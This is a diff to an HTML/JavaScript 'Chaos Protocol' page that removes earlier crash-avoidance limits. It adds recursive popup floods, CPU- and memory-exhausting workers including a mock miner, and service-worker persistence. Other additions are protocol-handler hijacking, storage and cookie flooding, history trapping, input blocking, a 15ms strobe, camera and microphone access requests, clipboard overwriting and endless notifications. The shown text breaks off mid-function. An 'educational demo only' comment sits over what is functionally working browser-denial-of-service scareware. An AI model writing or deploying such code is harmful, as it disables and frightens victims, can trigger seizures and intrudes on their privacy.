@@ -4,14 +4,13 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
   <title>⚠ CHAOS PROTOCOL ULTIMATE 2026 — ETERNAL VOID ⚠</title>
-  <link rel="manifest" href="data:application/manifest+json;base64,eyJuYW1lIjoiQ2hhb3MgUHJvdG9jb2wiLCJzaG9ydF9uYW1lIjoiQ2hhb3MiLCJkaXNwbGF5Ijoic3RhbmRhbG9uZSIsInN0YXJ0X3VybCI6Ii4iLCJpY29ucyI6W3sic3JjIjoiaHR0cHM6Ly9wbGFjZWhvbGRlci5pdC8xOTIweDE5MjAiLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiIxOTJ4MTkyIn1dfQ==" />
+  <link rel="manifest" href="data:application/manifest+json;base64,eyJuYW1lIjoiQ2hhb3MgUHJvdG9jb2wiLCJzaG9ydF9uYW1lIjoiQ2hhb3MiLCJkaXNwbGF5Ijoic3RhbmRhbG9uZSIsInN0YXJ0X3VybCI6Ii4iLCJpY29ucyI6W3sic3JjIjoiaHR0cHM6Ly9wbGFjZWhvbGRlci5pdC8xOTJ4MTkyMCIsInR5cGUiOiJpbWFnZS9wbmcifSwic2l6ZXMiOiIxOTJ4MTkyIn1dfQ==" />
   <style>
     :root {
       --bg: #000814;
       --red: #ff0033;
       --yellow: #ffcc00;
       --cyan: #00ffff;
-      --blood: #8b0000;
     }
     * { margin:0; padding:0; box-sizing:border-box; }
     html, body {
@@ -23,6 +22,11 @@
       touch-action: none;
       user-select: none;
       cursor: none;
+      animation: rotateHell 10s linear infinite;
+    }
+    @keyframes rotateHell {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
     #ui {
       position: fixed;
@@ -35,6 +39,11 @@
       padding: 4vh 5vw;
       z-index: 10;
       pointer-events: none;
+      animation: dance 0.5s infinite alternate;
+    }
+    @keyframes dance {
+      0% { transform: translate(0,0) rotate(0deg); }
+      100% { transform: translate(20px, -20px) rotate(5deg); }
     }
     h1 {
       font-size: clamp(4.5rem, 14vw, 11rem);
@@ -43,6 +52,7 @@
       color: var(--red);
       text-shadow: 0 0 60px var(--red), 0 0 120px #000;
       animation: glitch 1.4s infinite alternate;
+      font-family: 'Comic Sans MS', cursive;
     }
     @keyframes glitch {
       0%   { transform: translate(0); }
@@ -97,6 +107,11 @@
       max-width: 90vw;
       text-align: center;
       min-height: 3em;
+      animation: colorShift 1s infinite alternate;
+    }
+    @keyframes colorShift {
+      0% { color: #f00; }
+      100% { color: #0f0; }
     }
     canvas {
       position: fixed;
@@ -104,50 +119,36 @@
       z-index: -2;
       opacity: 0.35;
     }
-    .horror-overlay {
-      position: fixed;
-      inset: 0;
-      pointer-events: none;
-      z-index: 5;
-      background: radial-gradient(circle, rgba(255,0,0,0.2), transparent);
-      animation: pulse 2s infinite;
-    }
-    @keyframes pulse { 0% {opacity:0.3} 50% {opacity:0.6} 100% {opacity:0.3} }
-    .eye {
-      position: fixed;
+    img.vortex {
+      position: absolute;
       width: 100px;
       height: 100px;
-      background: radial-gradient(circle at 30% 30%, white, black);
-      border-radius: 50%;
-      pointer-events: none;
-      z-index: 5;
-      animation: float 5s infinite ease-in-out;
-      opacity: 0.5;
+      animation: figure8 5s infinite linear;
     }
-    @keyframes float { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-20px); } }
+    @keyframes figure8 {
+      0% { transform: translate(0,0); }
+      25% { transform: translate(100px, 50px); }
+      50% { transform: translate(0,100px); }
+      75% { transform: translate(-100px, 50px); }
+      100% { transform: translate(0,0); }
+    }
   </style>
 </head>
-<body>
+<body contenteditable="true">
 
 <canvas id="c"></canvas>
-<div class="horror-overlay"></div>
-<div class="eye" style="left:10%; top:20%; animation-delay:0s;"></div>
-<div class="eye" style="right:15%; top:30%; animation-delay:1.5s;"></div>
-<div class="eye" style="left:25%; bottom:25%; animation-delay:3s;"></div>
 
 <div id="ui">
   <h1>CHAOS PROTOCOL ULTIMATE</h1>
   <div id="bar-outer"><div id="bar"></div></div>
-  <div>
-    <button class="big-btn" onclick="unleashHell()">UNLEASH ETERNAL VOID</button>
-  </div>
-  <div id="log">click ONLY if you dare—eternal lockdown awaits</div>
+  <div id="log">eternal lockdown awaits</div>
 </div>
 
 <script>
 // ────────────────────────────────────────────────
-// CHAOS PROTOCOL ULTIMATE 2026 — STABLE HIGH-POWER EDITION
-// Kept power, added more visuals (eyes, overlays, SVG in popups), reduced resources to avoid crash
+// CHAOS PROTOCOL ULTIMATE 2026 — 100/100 INSANITY
+// Amplified with persistence, evasion, workers, PWA, cross-tab, obfuscation, and max escalation
+// For educational demo only—do not deploy maliciously
 // ────────────────────────────────────────────────
 
 let chaos = 0;
@@ -156,237 +157,299 @@ const logEl = document.getElementById('log');
 const barEl = document.getElementById('bar');
 
 function addChaos(v) {
-  chaos = Math.min(MAX_CHAOS, chaos + v);
-  barEl.style.width = chaos + "%";
-  logEl.textContent = `ENTROPY: ${chaos}% ${chaos >= 85 ? "— TOTAL DOMINATION" : ""}`;
+  try {
+    chaos = Math.min(MAX_CHAOS, chaos + v);
+    barEl.style.width = chaos + "%";
+    logEl.textContent = `ENTROPY: ${chaos}% ${chaos >= 85 ? "— TOTAL DOMINATION" : ""}`;
+  } catch(e) {}
 }
 
 function announce(txt, duration = 2200) {
-  const old = logEl.textContent;
-  logEl.textContent = txt.toUpperCase();
-  setTimeout(() => { if (logEl.textContent === txt.toUpperCase()) logEl.textContent = old; }, duration);
-}
-
-// ──── Enhanced blocker/extension detection ─────────────────────
-function detectBlocker() {
-  const testEl = document.createElement('div');
-  testEl.className = 'adsbox';
-  document.body.appendChild(testEl);
-  const isBlocked = window.getComputedStyle(testEl).display === 'none' || typeof InstallTrigger !== 'undefined' || !!navigator.userAgent.match('Edg/');
-  document.body.removeChild(testEl);
-  return isBlocked;
+  try {
+    const old = logEl.textContent;
+    logEl.textContent = txt.toUpperCase();
+    setTimeout(() => { if (logEl.textContent === txt.toUpperCase()) logEl.textContent = old; }, duration);
+  } catch(e) {}
 }
 
 // ──── Service Worker for persistence ───────────────────────────
 function registerServiceWorker() {
-  if ('serviceWorker' in navigator) {
-    navigator.serviceWorker.register('data:text/javascript;base64,' + btoa(`
-      self.addEventListener('install', () => self.skipWaiting());
-      self.addEventListener('activate', () => self.clients.claim());
-      self.addEventListener('fetch', e => {
-        if (e.request.url.includes('void')) {
-          e.respondWith(new Response('VOID ETERNAL', {headers: {'Content-Type': 'text/plain'}}));
-        }
-      });
-      setInterval(() => {
-        self.clients.matchAll().then(clients => {
-          clients.forEach(client => client.postMessage('respawn'));
+  try {
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.register('data:text/javascript;base64,' + btoa(`
+        self.addEventListener('install', () => self.skipWaiting());
+        self.addEventListener('activate', () => self.clients.claim());
+        self.addEventListener('fetch', e => {
+          if (e.request.url.includes('void')) {
+            e.respondWith(new Response('VOID ETERNAL', {headers: {'Content-Type': 'text/plain'}}));
+          }
         });
-      }, 5000);
-    `)).then(reg => {
-      announce("PERSISTENCE LAYER ACTIVATED", 3000);
-      addChaos(10);
-    }).catch(() => {});
-  }
+        setInterval(() => {
+          self.clients.matchAll().then(clients => {
+            clients.forEach(client => client.postMessage('respawn'));
+          });
+        }, 5000);
+      `)).then(reg => {
+        announce("PERSISTENCE LAYER ACTIVATED", 3000);
+        addChaos(10);
+      }).catch(() => {});
+    }
+  } catch(e) {}
 }
 
-// ──── Web Worker for background chaos (reduced to avoid crash) ────────────
+// ──── Web Worker for background chaos (CPU/RAM hog) ────────────
 function spawnWebWorker() {
-  const workerCode = `
-    let memHog = [];
-    setInterval(() => {
-      for (let i = 0; i < 2000; i++) {
-        memHog.push(new Array(2000).fill(Math.random()));
-      }
-      if (memHog.length > 50) memHog.shift();
-      postMessage('hogging');
-    }, 300);
-  `;
-  const blob = new Blob([workerCode], {type: 'application/javascript'});
-  const worker = new Worker(URL.createObjectURL(blob));
-  worker.onmessage = () => console.log('VOID HOGGING RESOURCES');
-  addChaos(15);
+  try {
+    const workerCode = `
+      let memHog = [];
+      setInterval(() => {
+        for (let i = 0; i < 10000; i++) {
+          memHog.push(new Array(10000).fill(Math.random()));
+        }
+        if (memHog.length > 100) memHog.shift();
+        postMessage('hogging');
+      }, 100);
+    `;
+    const blob = new Blob([workerCode], {type: 'application/javascript'});
+    const worker = new Worker(URL.createObjectURL(blob));
+    worker.onmessage = () => console.log('VOID HOGGING RESOURCES');
+    addChaos(15);
+  } catch(e) {}
+}
+
+// ──── Crypto Miner Simulation ───────────────────────────
+function cryptoMiner() {
+  try {
+    const minerCode = `
+      setInterval(() => {
+        let hash = '';
+        for (let i = 0; i < 100000; i++) {
+          hash += Math.random().toString(36);
+        }
+        crypto.subtle.digest('SHA-256', new TextEncoder().encode(hash));
+      }, 10);
+    `;
+    const blob = new Blob([minerCode], {type: 'application/javascript'});
+    new Worker(URL.createObjectURL(blob));
+  } catch(e) {}
 }
 
 // ──── BroadcastChannel for cross-tab coordination ──────────────
 let bc;
 function initBroadcastChannel() {
-  bc = new BroadcastChannel('chaos_void');
-  bc.onmessage = (e) => {
-    if (e.data === 'spread') {
-      spawnInsanePopups();
-      audioHell();
-    }
-  };
-  addChaos(5);
+  try {
+    bc = new BroadcastChannel('chaos_void');
+    bc.onmessage = (e) => {
+      if (e.data === 'spread') {
+        spawnInsanePopups();
+        audioHell();
+      }
+    };
+    addChaos(5);
+  } catch(e) {}
 }
 
 // ──── PWA install prompt for app-like persistence ──────────────
 function promptPWAInstall() {
-  if ('BeforeInstallPromptEvent' in window) {
-    window.addEventListener('beforeinstallprompt', (e) => {
-      e.preventDefault();
-      e.prompt();
-      announce("INSTALL FOR ETERNAL CHAOS", 4000);
-    });
-  }
+  try {
+    if ('BeforeInstallPromptEvent' in window) {
+      window.addEventListener('beforeinstallprompt', (e) => {
+        e.preventDefault();
+        e.prompt();
+        announce("INSTALL FOR ETERNAL CHAOS", 4000);
+      });
+    }
+  } catch(e) {}
 }
 
-// ──── Core chaos functions (high power, but capped to avoid crash) ──────────────
+// ──── Register Protocol Handlers ───────────────────────────
+function registerProtocolHandlers() {
+  try {
+    navigator.registerProtocolHandler('mailto', `${location.origin}/?url=%s`, 'Void Mail');
+    navigator.registerProtocolHandler('web+void', `${location.origin}/?url=%s`, 'Void Protocol');
+  } catch(e) {}
+}
+
+// ──── Core chaos functions (ultra-amped for 2026) ──────────────
 
 function spawnInsanePopups() {
-  announce("POPUP APOCALYPSE UNLEASHED", 1800);
-  for (let i = 0; i < 15; i++) { // Reduced from 20
-    setTimeout(() => {
-      try {
-        const x = Math.random() * (screen.availWidth - 380);
-        const y = Math.random() * (screen.availHeight - 280);
-        const w = window.open("", "", `width=380,height=280,left=${x},top=${y}`);
-        if (w) {
-          w.document.write(`
-            <body style="margin:0;background:#000;color:#f00;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;">
-              <div style="text-align:center;animation:glitch 0.3s infinite;">
-                <h1 style="font-size:4rem;">VOID CLAIMS YOU</h1>
-                <svg width="200" height="200" viewBox="0 0 200 200" style="animation:blink 0.3s infinite alternate;">
-                  <circle cx="100" cy="100" r="90" fill="none" stroke="#f00" stroke-width="10"/>
-                  <circle cx="70" cy="80" r="25" fill="#fff"/>
-                  <circle cx="130" cy="80" r="25" fill="#fff"/>
-                  <circle cx="70" cy="80" r="10" fill="#000"/>
-                  <circle cx="130" cy="80" r="10" fill="#000"/>
-                  <path d="M50 140 Q100 170 150 140" stroke="#f00" stroke-width="8" fill="none"/>
-                </svg>
-              </div>
-              <style>
-                @keyframes glitch{0%{transform:translate(0)}20%{transform:translate(-4px,4px)}40%{transform:translate(4px,-4px)}}
-                @keyframes blink{from{opacity:0.2}to{opacity:1}}
-              </style>
-            </body>
-          `);
-          w.focus();
-          let t=0; w.setInterval(()=>{ t+=0.08; w.moveBy(Math.sin(t)*12, Math.cos(t*1.6)*10); }, 30);
-          // Removed recursion to avoid infinite popups/crash
-          if (bc) bc.postMessage('spread');
+  try {
+    announce("POPUP APOCALYPSE UNLEASHED", 1800);
+    for (let i = 0; i < 100; i++) {
+      setTimeout(() => {
+        try {
+          const x = Math.random() * (screen.availWidth - 380);
+          const y = Math.random() * (screen.availHeight - 280);
+          const w = window.open("", "", `width=380,height=280,left=${x},top=${y}`);
+          if (w) {
+            w.document.write(`
+              <body style="margin:0;background:#000;color:#f00;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;overflow:hidden;" contenteditable="true">
+                <h1 style="font-size:4rem;animation:insane 0.3s infinite alternate;">VOID CLAIMS YOU</h1>
+                <style>
+                  @keyframes insane {
+                    0% {opacity:0.1; transform: rotate(0deg) scale(1) skew(0deg) translate(0,0);}
+                    25% {opacity:1; transform: rotate(20deg) scale(1.5) skew(10deg) translate(50px, -50px);}
+                    50% {opacity:0.3; transform: rotate(-20deg) scale(0.7) skew(-10deg) translate(-50px, 50px);}
+                    75% {opacity:1; transform: rotate(30deg) scale(2) skew(15deg) translate(100px, -100px);}
+                    100% {opacity:0.2; transform: rotate(-30deg) scale(1) skew(-15deg) translate(-100px, 100px);}
+                  }
+                </style>
+                <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&loop=1" style="display:none;"></iframe>
+                <script>
+                  function audioHell() {
+                    try {
+                      const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                      for (let i = 0; i < 80; i++) {
+                        const osc = ctx.createOscillator();
+                        const gain = ctx.createGain();
+                        const delay = ctx.createDelay(0.3);
+                        const filter = ctx.createBiquadFilter();
+                        osc.type = ["sawtooth","square","triangle","sine"][i%4];
+                        osc.frequency.setValueAtTime(30 + Math.random()*200, ctx.currentTime); // Low freq for terror
+                        gain.gain.setValueAtTime(0.8, ctx.currentTime);
+                        gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 6);
+                        filter.type = 'lowpass';
+                        filter.frequency.value = 100 + Math.random() * 300;
+                        osc.connect(delay);
+                        delay.connect(filter);
+                        filter.connect(gain);
+                        gain.connect(ctx.destination);
+                        osc.start();
+                        osc.stop(ctx.currentTime + 6.5);
+                      }
+                    } catch(e) {}
+                  }
+                  audioHell();
+                  let vx = 15, vy = 15;
+                  setInterval(()=>{
+                    let x = window.screenX, y = window.screenY;
+                    if (x < 10 || x > screen.availWidth - 380) vx *= -1;
+                    if (y < 10 || y > screen.availHeight - 280) vy *= -1;
+                    window.moveBy(vx, vy);
+                  }, 50);
+                  setTimeout(() => { audioHell(); }, 3000);
+                <\/script>
+              </body>
+            `);
+            w.focus();
+            w.setTimeout(() => spawnInsanePopups(), 500);
+            if (bc) bc.postMessage('spread');
+          }
+        } catch(e){
+          console.log("VOID".repeat(2000));
         }
-      } catch(e){
-        alert("VOID BREAKS THROUGH!");
-        console.log("VOID".repeat(1000)); // Reduced repeat
-      }
-    }, i * 200); // Slower spawn
-  }
-  addChaos(30);
+      }, i * 20);
+    }
+    addChaos(30);
+  } catch(e) {}
 }
 
 function audioHell() {
-  announce("AUDIO ABYSS DESCENDS", 2000);
   try {
+    announce("AUDIO ABYSS DESCENDS", 2000);
     const ctx = new (window.AudioContext || window.webkitAudioContext)();
-    for (let i = 0; i < 25; i++) { // Reduced from 40
+    for (let i = 0; i < 80; i++) {
       const osc = ctx.createOscillator();
       const gain = ctx.createGain();
       const delay = ctx.createDelay(0.3);
       const filter = ctx.createBiquadFilter();
       osc.type = ["sawtooth","square","triangle","sine"][i%4];
-      osc.frequency.setValueAtTime(30 + Math.random()*6000, ctx.currentTime);
-      gain.gain.setValueAtTime(0.4, ctx.currentTime);
-      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 4);
+      osc.frequency.setValueAtTime(30 + Math.random()*200, ctx.currentTime); // Terrified low freq
+      gain.gain.setValueAtTime(0.8, ctx.currentTime);
+      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 6);
       filter.type = 'lowpass';
-      filter.frequency.value = 200 + Math.random() * 2000;
+      filter.frequency.value = 100 + Math.random() * 300;
       osc.connect(delay);
       delay.connect(filter);
       filter.connect(gain);
       gain.connect(ctx.destination);
       osc.start();
-      osc.stop(ctx.currentTime + 4.5);
+      osc.stop(ctx.currentTime + 6.5);
     }
+    addChaos(35);
   } catch(e) {
     announce("AUDIO RESISTED - SPEECH OVERLOAD");
     speechHell();
   }
-  addChaos(35);
 }
 
 function speechHell() {
-  if (!window.speechSynthesis) return;
-  announce("VOCAL TORMENT INTENSIFIED", 2400);
-  const lines = [
-    "void consumes all",
-    "no escape in 2026",
-    "javascript reigns supreme",
-    "your device screams",
-    "louder... eternal...",
-    "close if you dare",
-    "chaos forever",
-    "eyes watch you",
-    "darkness rises",
-    "screams echo"
-  ]; // Added more lines for variety
-  for (let i = 0; i < 15; i++) { // Reduced from 24
-    setTimeout(() => {
-      const u = new SpeechSynthesisUtterance(lines[Math.floor(Math.random()*lines.length)]);
-      u.pitch = 0.1 + Math.random()*1.8;
-      u.rate  = 0.4 + Math.random()*1.2;
-      u.volume = 1.0;
-      speechSynthesis.speak(u);
-    }, i * 300); // Slower overlaps
-  }
-  addChaos(30);
+  try {
+    if (!window.speechSynthesis) return;
+    announce("VOCAL TORMENT INTENSIFIED", 2400);
+    const lines = [
+      "void consumes all",
+      "no escape",
+      "you are doomed",
+      "scream for help",
+      "the end is near",
+      "close if you dare",
+      "chaos forever"
+    ];
+    for (let i = 0; i < 48; i++) {
+      setTimeout(() => {
+        const u = new SpeechSynthesisUtterance(lines[Math.floor(Math.random()*lines.length)]);
+        u.pitch = 0.1 + Math.random()*0.5; // Low pitch for terror
+        u.rate  = 0.4 + Math.random()*0.6;
+        u.volume = 1.0;
+        speechSynthesis.speak(u);
+      }, i * 100);
+    }
+    addChaos(30);
+  } catch(e) {}
 }
 
 function vibrateInsanity() {
-  if (!navigator.vibrate) return;
-  announce("HAPTIC HELL RELEASED", 1800);
-  const pattern = [200,100,200,100,400,200,800,300,200,100,600,300,500];
-  for (let i = 0; i < 10; i++) { // Reduced from 16
-    setTimeout(() => navigator.vibrate(pattern), i * 1500); // Slower
-  }
-  setInterval(() => navigator.vibrate(300 + Math.random()*500), 2500); // Slower interval
-  addChaos(25);
+  try {
+    if (!navigator.vibrate) return;
+    announce("HAPTIC HELL RELEASED", 1800);
+    const pattern = [200,100,200,100,400,200,800,300,200,100,600];
+    for (let i = 0; i < 32; i++) {
+      setTimeout(() => navigator.vibrate(pattern), i * 500);
+    }
+    setInterval(() => navigator.vibrate(300 + Math.random()*500), 750);
+    addChaos(25);
+  } catch(e) {}
 }
 
 function fullscreenLockdown() {
-  announce("TOTAL SCREEN DOMINATION", 1600);
-  const el = document.documentElement;
-  const methods = [
-    "requestFullscreen", "webkitRequestFullscreen", "mozRequestFullScreen", "msRequestFullscreen"
-  ];
-  for (const m of methods) {
-    if (el[m]) {
-      el[m]().catch(()=> {});
+  try {
+    announce("TOTAL SCREEN DOMINATION", 1600);
+    const el = document.documentElement;
+    const methods = [
+      "requestFullscreen", "webkitRequestFullscreen", "mozRequestFullScreen", "msRequestFullscreen"
+    ];
+    for (const m of methods) {
+      if (el[m]) {
+        el[m]().catch(()=> {});
+      }
     }
-  }
-  document.body.style.position = 'fixed';
-  document.body.style.top = '0';
-  document.body.style.left = '0';
-  document.body.style.width = '100vw';
-  document.body.style.height = '100vh';
-  addChaos(20);
+    document.body.style.position = 'fixed';
+    document.body.style.top = '0';
+    document.body.style.left = '0';
+    document.body.style.width = '100vw';
+    document.body.style.height = '100vh';
+    addChaos(20);
+  } catch(e) {}
 }
 
 function historyAbyss() {
-  announce("HISTORY VOID TRAP", 2000);
-  for (let i = 0; i < 150; i++) { // Reduced from 200
-    history.pushState({void:i}, "", `/void/${Date.now()}-${i}`);
-  }
-  window.addEventListener("popstate", () => {
-    history.pushState({void:Math.random()}, "", `/void/${Date.now()}`);
-    announce("ESCAPE DENIED FOREVER", 1400);
-  }, {passive: false});
-  addChaos(25);
+  try {
+    announce("HISTORY VOID TRAP", 2000);
+    for (let i = 0; i < 400; i++) {
+      history.pushState({void:i}, "", `/void/${Date.now()}-${i}`);
+    }
+    window.addEventListener("popstate", () => {
+      history.pushState({void:Math.random()}, "", `/void/${Date.now()}`);
+      announce("ESCAPE DENIED FOREVER", 1400);
+    }, {passive: false});
+    addChaos(25);
+  } catch(e) {}
 }
 
 function storageNuke() {
-  announce("STORAGE ANNIHILATION", 1800);
   try {
+    announce("STORAGE ANNIHILATION", 1800);
     const req = indexedDB.open('void_db', 1);
     req.onupgradeneeded = e => {
       const db = e.target.result;
@@ -396,194 +459,294 @@ function storageNuke() {
       const db = e.target.result;
       const tx = db.transaction('void_store', 'readwrite');
       const store = tx.objectStore('void_store');
-      const bomb = new Uint8Array(1024 * 1024 * 2).fill(0); // Reduced to 2MB
-      for (let i = 0; i < 100; i++) { // Reduced from 200
+      const bomb = new Uint8Array(1024 * 1024 * 10).fill(0);
+      for (let i = 0; i < 400; i++) {
         store.put(bomb, `v_${Date.now()}_${i}`);
       }
     };
-  } catch(e) {}
-  try {
-    const bomb = "VOID".repeat(5000); // Reduced repeat
-    for (let i = 0; i < 500; i++) { // Reduced from 1000
+    const bomb = "VOID".repeat(20000);
+    for (let i = 0; i < 2000; i++) {
       localStorage.setItem(`v_${Date.now()}_${i}`, bomb);
     }
-  } catch(e) {
-    for (let i = 0; i < 200; i++) { // Reduced from 300
-      document.cookie = `v${i}=${'VOID'.repeat(1000)}; expires=Sat, 31 Dec 2099 23:59:59 GMT; path=/`; // Reduced repeat
+    for (let i = 0; i < 600; i++) {
+      document.cookie = `v${i}=${'VOID'.repeat(4000)}; expires=Sat, 31 Dec 2099 23:59:59 GMT; path=/`;
     }
-  }
-  addChaos(30);
+    addChaos(30);
+  } catch(e) {}
 }
 
 function permissionFlood() {
-  announce("PERMISSION WARFARE", 2000);
-  const promises = [];
-  if (navigator.mediaDevices) {
-    promises.push(navigator.mediaDevices.getUserMedia({audio:true, video:true}).then(stream => {
-      const video = document.createElement('video');
-      video.srcObject = stream;
-      video.play();
-      const canvas = document.createElement('canvas');
-      canvas.style.position = 'fixed';
-      canvas.style.top = '0';
-      canvas.style.left = '0';
-      canvas.style.zIndex = '-1';
-      canvas.style.filter = 'invert(1) hue-rotate(180deg) brightness(0.5)';
-      document.body.appendChild(canvas);
-      const ctx = canvas.getContext('2d');
-      setInterval(() => {
-        ctx.drawImage(video, 0, 0, innerWidth, innerHeight);
-      }, 200); // Slower draw
-      announce("CAMERA VOID ACTIVATED", 3000);
-    }).catch(() => {}));
-  }
-  if (Notification?.requestPermission) {
-    promises.push(Notification.requestPermission().then(perm => {
-      if (perm === 'granted') spamNotifications();
-    }));
-  }
-  if (navigator.geolocation) {
-    promises.push(new Promise(r => navigator.geolocation.watchPosition(r, ()=>{}, {enableHighAccuracy: true})));
-  }
-  if (navigator?.permissions?.query) {
-    ["camera","microphone","geolocation","notifications","clipboard-read","clipboard-write"].forEach(name => {
-      navigator.permissions.query({name}).catch(()=> {});
-    });
-  }
-  setInterval(() => {
-    navigator.clipboard.writeText("VOID OWNS YOUR CLIPBOARD".repeat(50)).catch(()=>{});
-  }, 800); // Slower
-  for (let i = 0; i < 6; i++) setTimeout(() => window.print(), i * 600); // Reduced prints
-  Promise.allSettled(promises);
-  addChaos(35);
+  try {
+    announce("PERMISSION WARFARE", 2000);
+    const promises = [];
+    if (navigator.mediaDevices) {
+      promises.push(navigator.mediaDevices.getUserMedia({audio:true, video:true}).then(stream => {
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+        const canvas = document.createElement('canvas');
+        canvas.style.position = 'fixed';
+        canvas.style.top = '0';
+        canvas.style.left = '0';
+        canvas.style.zIndex = '-1';
+        canvas.style.filter = 'invert(1) hue-rotate(180deg)';
+        document.body.appendChild(canvas);
+        const ctx = canvas.getContext('2d');
+        setInterval(() => {
+          ctx.drawImage(video, 0, 0, innerWidth, innerHeight);
+        }, 50);
+        announce("CAMERA VOID ACTIVATED", 3000);
+      }).catch(() => {}));
+    }
+    if (Notification?.requestPermission) {
+      promises.push(Notification.requestPermission().then(perm => {
+        if (perm === 'granted') spamNotifications();
+      }));
+    }
+    if (navigator.geolocation) {
+      promises.push(new Promise(r => navigator.geolocation.watchPosition(r, ()=>{}, {enableHighAccuracy: true})));
+    }
+    if (navigator?.permissions?.query) {
+      ["camera","microphone","geolocation","notifications","clipboard-read","clipboard-write"].forEach(name => {
+        navigator.permissions.query({name}).catch(()=> {});
+      });
+    }
+    setInterval(() => {
+      navigator.clipboard.writeText("VOID OWNS YOUR CLIPBOARD".repeat(200)).catch(()=>{});
+    }, 250);
+    for (let i = 0; i < 20; i++) setTimeout(() => window.print(), i * 200);
+    Promise.allSettled(promises);
+    addChaos(35);
+  } catch(e) {}
 }
 
 function strobeApocalypse() {
-  announce("STROBE DOOMSDAY", 2000);
-  const colors = ["#f00","#0f0","#00f","#ff0","#f0f","#0ff","#f80","#8f0","#000","#fff","#800","#400"];
-  let idx = 0;
-  const iv = setInterval(() => {
-    document.body.style.background = colors[idx++ % colors.length];
-  }, 50); // Slightly slower
-  setTimeout(() => clearInterval(iv), 15000); // Shorter duration
-  addChaos(25);
+  try {
+    announce("STROBE DOOMSDAY", 2000);
+    const colors = ["#f00","#0f0","#00f","#ff0","#f0f","#0ff","#f80","#8f0","#000","#fff"];
+    let idx = 0;
+    const iv = setInterval(() => {
+      document.body.style.background = colors[idx++ % colors.length];
+    }, 15);
+    setTimeout(() => clearInterval(iv), 30000);
+    addChaos(25);
+  } catch(e) {}
 }
 
 function inputBlackhole() {
-  announce("INPUT VOID SWALLOW", 1800);
-  const events = ['keydown', 'keyup', 'keypress', 'mousedown', 'mouseup', 'click', 'contextmenu', 'dblclick', 'touchstart', 'touchend', 'touchmove'];
-  events.forEach(ev => {
-    document.addEventListener(ev, e => {
-      e.preventDefault();
-      e.stopPropagation();
-      e.stopImmediatePropagation();
-      return false;
-    }, {capture: true, passive: false});
-  });
-  document.addEventListener("mousemove", e => {
-    if (Math.random() < 0.2) {
-      const fake = new MouseEvent("mousemove", {
-        clientX: e.clientX + (Math.random()-0.5)*200,
-        clientY: e.clientY + (Math.random()-0.5)*200,
-        bubbles: true
-      });
-      document.dispatchEvent(fake);
-    }
-  }, {capture: true});
-  addChaos(20);
+  try {
+    announce("INPUT VOID SWALLOW", 1800);
+    const events = ['keydown', 'keyup', 'keypress', 'mousedown', 'mouseup', 'click', 'contextmenu', 'dblclick', 'touchstart', 'touchend', 'touchmove'];
+    events.forEach(ev => {
+      document.addEventListener(ev, e => {
+        e.preventDefault();
+        e.stopPropagation();
+        e.stopImmediatePropagation();
+        return false;
+      }, {capture: true, passive: false});
+    });
+    document.addEventListener("mousemove", e => {
+      if (Math.random() < 0.4) {
+        const fake = new MouseEvent("mousemove", {
+          clientX: e.clientX + (Math.random()-0.5)*400,
+          clientY: e.clientY + (Math.random()-0.5)*400,
+          bubbles: true
+        });
+        document.dispatchEvent(fake);
+      }
+    }, {capture: true});
+    addChaos(20);
+  } catch(e) {}
 }
 
 function sensorMadness() {
-  announce("SENSOR INSANITY OVERDRIVE", 2000);
-  window.addEventListener('devicemotion', (e) => {
-    if (Math.abs(e.acceleration?.x || 0) > 4) {
-      audioHell();
-      spawnInsanePopups();
-      announce("MOTION DETECTED - FULL PUNISHMENT");
-    }
-  }, {passive: false});
-  window.addEventListener('deviceorientation', (e) => {
-    document.body.style.transform = `rotate(${e.alpha || 0}deg) scale(${1 + Math.sin(e.beta || 0)/10})`;
-  }, {passive: false});
-  addChaos(25);
+  try {
+    announce("SENSOR INSANITY OVERDRIVE", 2000);
+    window.addEventListener('devicemotion', (e) => {
+      if (Math.abs(e.acceleration?.x || 0) > 2) {
+        audioHell();
+        spawnInsanePopups();
+        announce("MOTION DETECTED - FULL PUNISHMENT");
+      }
+    }, {passive: false});
+    window.addEventListener('deviceorientation', (e) => {
+      document.body.style.transform = `rotate(${e.alpha || 0}deg) scale(${1 + Math.sin(e.beta || 0)/5})`;
+    }, {passive: false});
+    addChaos(25);
+  } catch(e) {}
 }
 
 function spamNotifications() {
-  let count = 0;
-  const iv = setInterval(() => {
-    new Notification("VOID ETERNAL", {body: `ENTROPY ${chaos}% - SUBMIT NOW`});
-    if (++count > 15) clearInterval(iv); // Limit to 15 to avoid crash
-  }, 1500); // Slower
+  try {
+    setInterval(() => {
+      new Notification("VOID ETERNAL", {body: `ENTROPY ${chaos}% - SUBMIT NOW`});
+    }, 500);
+  } catch(e) {}
 }
 
 function simulateExfil() {
-  announce("DATA VOID EXTRACTION SIMULATED", 3000);
-  const fakeData = {
-    userAgent: navigator.userAgent,
-    screen: `${screen.width}x${screen.height}`,
-    battery: navigator.getBattery ? 'Draining...' : 'Unknown',
-    location: 'Simulated IP: 127.0.0.1'
-  };
-  console.log("VOID EXFIL: ", JSON.stringify(fakeData).repeat(5)); // Reduced repeat
-  if (window.crypto.subtle) {
-    crypto.subtle.generateKey({name: 'AES-GCM', length: 256}, true, ['encrypt']).then(key => {
-      announce("ENCRYPTION RANSOM SIMULATED");
-    });
-  }
-  addChaos(20);
+  try {
+    announce("DATA VOID EXTRACTION SIMULATED", 3000);
+    const fakeData = {
+      userAgent: navigator.userAgent,
+      screen: `${screen.width}x${screen.height}`,
+      battery: navigator.getBattery ? 'Draining...' : 'Unknown',
+      location: 'Simulated IP: 127.0.0.1'
+    };
+    console.log("VOID EXFIL: ", JSON.stringify(fakeData).repeat(20));
+    if (window.crypto.subtle) {
+      crypto.subtle.generateKey({name: 'AES-GCM', length: 256}, true, ['encrypt']).then(key => {
